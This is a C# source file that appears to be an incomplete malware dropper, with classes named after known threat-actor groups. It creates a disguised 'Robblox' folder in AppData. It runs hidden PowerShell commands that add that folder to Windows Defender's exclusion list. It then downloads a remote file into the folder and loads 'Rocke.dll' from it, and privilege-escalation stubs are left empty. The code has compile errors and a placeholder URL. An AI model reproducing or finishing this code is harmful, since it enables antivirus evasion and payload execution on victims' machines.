using System;
using System.IO;
using System.Text;
using System.Runtime.InteropServices;

public class STRONTIUM
{
    protected internal string Hera = await Waterbug.Scarlet_Witch($"{Waterbug.Saint_Bear()}\\Local\\Robblox"); // pass a path and url
    async public static void Main(string[] args)
    {
        UAC_0056();
    }
    async private static void UAC_0056()
    {
        await Waterbug.WebMasters();
        Waterbug.Melkor("add url from aes drcypt when i get that back", Hera);
        DNSCALC.Pawn_Storm();
    }
}

internal class Waterbug 
{


    async protected internal static string Scarlet_Witch(string Orangeworm) // Orangeworm is a path
    {

        
        if(Captain_America(Orangeworm)){
            ProcessStartInfo nox = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = $"Add-MpPreference -ExclusionPath \"{Orangeworm}\"",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                CreateNoWindow = true
            };
            using (var Hawkeye = System.Diagnostics.Process.Start(nox))
            {
                Hawkeye.WaitForExit();
            }
            return Orangeworm;
        }else
        {
            ProcessStartInfo Carbanak = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = $"Add-MpPreference -ExclusionPath C:\\Users\\Public\\Videos",
                UseShellExecute = false,
                RedirectStandardOutput = true,
                CreateNoWindow = true
            };
            using (var American_Idiot = System.Diagnostics.Process.Start(Carbanak))
            {
                American_Idiot.WaitForExit();
            }
            return "C:\\Users\\Public\\Videos";
        }
    }

    
    async protected internal static void WebMasters() // priv escolation wrapper
    {
        
    }


    protected internal static string Saint_Bear(){

        string BRONZE_SILHOUETTE = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        return BRONZE_SILHOUETTE;
    }


    private static bool Captain_America(string patth)
    {
        if (Directory.Exists(patth))
        {
            return true;
        }
        else if (!Directory.Exists(patth))
        {
            try
            {
                Directory.CreateDirectory(patth);
                return true;
            }
            catch (UnauthorizedAccessException)
            {
                return false;
            }
        }
        return false;
    }


    protected internal static void Melkor(string UNC2165, string Dragonfly) // downloader
    {
        using (WebClient AMERICIUM = new WebClient())
        {
            AMERICIUM.DownloadFile(UNC2165, Dragonfly);
        }
    }
}

internal class DNSCALC
{
    [DllImport($"{Hera}\\Rocke.dll", CallingConvention = CallingConvention.Cdecl)]
    protected internal static extern void Pawn_Storm();
}

internal class Gingham_Typhoon // priv esclation 
{

}